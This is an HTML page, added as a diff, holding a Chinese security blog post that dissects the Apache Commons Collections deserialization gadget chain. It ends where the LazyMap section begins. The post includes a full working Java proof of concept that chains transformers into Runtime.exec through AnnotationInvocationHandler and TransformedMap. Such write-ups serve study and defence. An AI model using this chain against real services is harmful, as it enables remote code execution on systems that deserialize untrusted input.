@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x00 前言文章涉及的几个关键点：  java反序列化原理 Apache Commons Collections利用链 AnnotationInvocationHandler反序列化 基于TransfomedMap的调用链 基于LazyMap的调用链  文中复现使用的环境为jdk6，Apache Commons Collections3.1 0x01 java反序列化原理在java中可以将实现了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反序列化-Apache Commons Collections">
+<meta property="og:url" content="http://example.com/2020/01/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Apache-Commons-Collections/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="0x00 前言文章涉及的几个关键点：  java反序列化原理 Apache Commons Collections利用链 AnnotationInvocationHandler反序列化 基于TransfomedMap的调用链 基于LazyMap的调用链  文中复现使用的环境为jdk6，Apache Commons Collections3.1 0x01 java反序列化原理在java中可以将实现了">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-01-06T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-03-17T05:58:50.163Z">
+<meta property="article:author" content="PENCH3R">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>反序列化-Apache Commons Collections</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/category/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tag/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2020/01/07/OSSEC-logcollector-analysis/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2020/01/07/OSSEC-syscheckd-analysis/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/01/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Apache-Commons-Collections/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/01/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Apache-Commons-Collections/&text=反序列化-Apache Commons Collections"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/01/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Apache-Commons-Collections/&title=反序列化-Apache Commons Collections"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/01/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Apache-Commons-Collections/&is_video=false&description=反序列化-Apache Commons Collections"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=反序列化-Apache Commons Collections&body=Check out this article: http://example.com/2020/01/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Apache-Commons-Collections/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/01/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Apache-Commons-Collections/&title=反序列化-Apache Commons Collections"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/01/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Apache-Commons-Collections/&title=反序列化-Apache Commons Collections"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/01/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Apache-Commons-Collections/&title=反序列化-Apache Commons Collections"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/01/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Apache-Commons-Collections/&title=反序列化-Apache Commons Collections"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/01/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Apache-Commons-Collections/&name=反序列化-Apache Commons Collections&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/01/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Apache-Commons-Collections/&t=反序列化-Apache Commons Collections"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">0x01 java反序列化原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Apache-Commons-Collections%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">0x02 Apache Commons Collections利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-AnnotationInvocationHandler%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.</span> <span class="toc-text">0x03 AnnotationInvocationHandler反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%9F%BA%E4%BA%8ETransformedMap%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">5.</span> <span class="toc-text">0x04 基于TransformedMap的调用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%9F%BA%E4%BA%8ELazyMap%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">6.</span> <span class="toc-text">0x05 基于LazyMap的调用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A2%B0%E5%88%B0%E7%9A%84%E5%9D%91"><span class="toc-number">7.</span> <span class="toc-text">碰到的坑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">0x06 总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        反序列化-Apache Commons Collections
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">PENCH3R</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-01-06T16:00:00.000Z" itemprop="datePublished">2020-01-07</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WebSecurity/">WebSecurity</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>文章涉及的几个关键点：</p>
+<ul>
+<li>java反序列化原理</li>
+<li>Apache Commons Collections利用链</li>
+<li>AnnotationInvocationHandler反序列化</li>
+<li>基于TransfomedMap的调用链</li>
+<li>基于LazyMap的调用链</li>
+</ul>
+<p>文中复现使用的环境为jdk6，Apache Commons Collections3.1</p>
+<h2 id="0x01-java反序列化原理"><a href="#0x01-java反序列化原理" class="headerlink" title="0x01 java反序列化原理"></a>0x01 java反序列化原理</h2><p>在java中可以将实现了Serializable/Externalizable接口的类进行序列化，使用ObjectOutputStream.writeobject即可进行序列化操作</p>
+<p>序列化后的数据为二进制数据流，需要关注的是序列化后的数据特征，开头为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 二进制</span><br><span class="line">ac ed 00 05</span><br><span class="line"># base64</span><br><span class="line">rO0AB</span><br></pre></td></tr></table></figure>
+
+<p>而反序列化则是将二进制数据转换为对应的object，使用ObjectInputStream.readobject进行反序列化，但这里也会调用接收的序列化对象的readobject方法(如果该对象重写了此方法)，这里就是一个关键点</p>
+<p>如果在重写的readobject中引用攻击者传入的序列化对象数据进行敏感操作也会导致安全问题，例如命令执行、文件读取等</p>
+<h2 id="0x02-Apache-Commons-Collections利用链"><a href="#0x02-Apache-Commons-Collections利用链" class="headerlink" title="0x02 Apache Commons Collections利用链"></a>0x02 Apache Commons Collections利用链</h2><p>在2015年爆出Apache Commons Collections公共库中存在命令执行利用链，这样就放大了反序列漏洞的危害，同年就导致很多知名的web应用都受到影响。</p>
+<p>这个库产生的问题只是给反序列化不安全数据，提供了一个稳定的命令执行利用链，因此要真正利用该库的漏洞需要满足以下条件：</p>
+<ul>
+<li>目标应用的包路径下包含commons collections &lt; 3.1版本</li>
+<li>readObject反序列化的数据可控</li>
+</ul>
+<p>ps: 不同jdk版本对象的payload有所不同</p>
+<p>该利用链涉及以下类：</p>
+<ul>
+<li>TransformedMap</li>
+<li>InvokerTransformer、ConstantTransformer</li>
+<li>ChainedTransformer</li>
+</ul>
+<p>最终触发命令的地方为org.apache.commons.collections.functors.InvokerTransformer：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用传入参数input和类中的属性，进行命令执行，构造函数如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>org.apache.commons.collections.functors.ConstantTransformer可以理解为返回一个常量object即可：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># 构造函数</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>要进行利用，都需要执行其对应的transform函数，此时就引入了org.apache.commons.collections.functors.ChainedTransformer：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过在构造函数中传入以Transformer为基本数据类型的数组，调用transform会依次调用Transformer对应的transform函数</p>
+<p>ps：这里的Transformer为ConstantTransformer和InvokerTransformer的父类，这里会将前一个Transformer执行的transform结果，当成下一个Transformer.transform参数，形成了一个链</p>
+<p>接着需要找到可以触发ChainedTransformer.transform，同时可以控制类中的iTransformers。</p>
+<p>本文介绍两个利用链：一个基于TransformedMap、一个基于LazyMap</p>
+<h2 id="0x03-AnnotationInvocationHandler反序列化"><a href="#0x03-AnnotationInvocationHandler反序列化" class="headerlink" title="0x03 AnnotationInvocationHandler反序列化"></a>0x03 AnnotationInvocationHandler反序列化</h2><p>在介绍调用链之前，需要关注真正反序列化触发的入口点：sun.reflect.annotation.AnnotationInvocationHandler，该类存在与JDK中，以下代码为该类的readObject函数：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();		<span class="comment">// 位置1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">        <span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Entry)var4.next();</span><br><span class="line">        <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));	<span class="comment">// 位置2</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有两个可利用的触发点：</p>
+<ul>
+<li>位置1: Iterator var4 = this.memberValues.entrySet().iterator();</li>
+<li>位置2: var5.setValue()</li>
+</ul>
+<p>该类中的memberValues可以通过构造该类对象并进行序列化的方式进行控制，以下为该类可控制的数据类型：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    <span class="built_in">this</span>.type = var1;</span><br><span class="line">    <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>位置1对应TransformedMap调用链；</p>
+<p>位置2对应LazyMap调用链</p>
+<h2 id="0x04-基于TransformedMap的调用链"><a href="#0x04-基于TransformedMap的调用链" class="headerlink" title="0x04 基于TransformedMap的调用链"></a>0x04 基于TransformedMap的调用链</h2><p>通过org.apache.commons.collections.map.TransformedMap进行完美触发ChainedTransformer.transform：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要关心的是valueTransformer是否可控，对应的构造函数：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上述构造函数表明可以控制valueTransformer的值。</p>
+<p>ps：这里除了可以利用checkSetValue也可以通过put方法进行触发，这里就不再展开。</p>
+<p>再次通过org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue即可实现触发执行checkSetValue</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    value = <span class="built_in">this</span>.parent.checkSetValue(value);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>恰巧TransformedMap实现了该接口，this.parent即为TransformedMap本身</p>
+<p>进行到这里得到的利用链如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TransformedMap.SetValue -&gt; TransformedMap.checkSetValue -&gt; ChainedTransformer.transform -&gt; Transformer.transform -&gt; Transformer.transform -&gt; ...</span><br></pre></td></tr></table></figure>
+
+<p>ps: 上述Transformer代表InvokerTransformer、ConstantTransformer, 通过链的形式依次调用所有Transformer</p>
+<p>按照思路需要再寻找可以触发TransformedMap.SetValue的点，此时就对应上了上节介绍的AnnotationInvocationHandler，通过位置2即可触发整个利用链，构造的payload脚本如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">deserialPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Reverse_Payload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;open /Applications/Atom.app/&quot;</span> &#125;) &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innermap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outmap</span> <span class="operator">=</span> TransformedMap.decorate(innermap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//通过反射获得AnnotationInvocationHandler类对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">//通过反射获得cls的构造函数</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">//这里需要设置Accessible为true，否则序列化失败</span></span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//通过newInstance()方法实例化对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(Retention.class, outmap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        GeneratePayload(Reverse_Payload(),<span class="string">&quot;obj&quot;</span>);</span><br><span class="line">        payloadTest(<span class="string">&quot;obj&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">GeneratePayload</span><span class="params">(Object instance, String file)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//将构造好的payload序列化后写入文件中</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(file);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(f));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">payloadTest</span><span class="params">(String file)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//读取写入的payload，并进行反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-基于LazyMap的调用链"><a href="#0x05-基于LazyMap的调用链" class="headerlink" title="0x05 基于LazyMap的调用链"></a>0x05 基于LazyMap的调用链</h2><p>在Apache common collections只要可以触发ChainedTransformer.transform即可，通过”Ysoserial”利用工具可得到通过org.apache.commons.collections.LazyMap进行利用的调用链</p>
